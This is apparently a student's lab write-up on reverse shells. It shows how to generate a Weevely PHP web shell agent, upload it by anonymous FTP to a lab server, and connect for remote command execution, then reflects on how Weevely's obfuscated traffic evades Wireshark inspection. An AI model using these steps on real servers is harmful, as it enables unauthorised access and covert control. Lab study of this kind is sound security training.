# Reverse Shells

### Lab 8.1 Weevley

Weevley is a built in tool included within Kali. Weevely is a web shell designed for post-exploitation purposes that can be extended over the network at runtime. Upload weevely PHP agent to a target web server to get remote shell access to it. It has more than 30 modules to assist administrative tasks, maintain access, provide situational awareness, elevate privileges, and spread into the target network.

The Usage is pretty simple. The commands below show the generation of a php agent that will then get upoaded to a webserver.
```
weevely generate <password> <path>
weevely <URL> <password> [cmd]
```

A password is needed to encrypt the agent

The upload process to our FTP is simple. Triggering an FTP session by using `ftp anonymous@10.0.5.25` then moving directories to `upload`. From here we can upload the file directly to the right directory. That command is `put`

`put pippin_agent.php `

With a succsessful upload we can now utilize the agent.

We can run the agent by using `weevely http://10.0.5.25/upload/pippin_agent.php <insert password>`

From here we now have a webshell into 10.0.5.25 and can run commands. 

#### Refelction

The diffrence in stealth is made clear when using weevely compared to a curl using simple_backdoor. The Wireshark stream showed a comlpete detail and display of the leaked etc/passwd/ output when using simple_backdoor.php. Using Weevely there was obfuscation in the TCP stream that Wireshark couldnt blantanly see. 
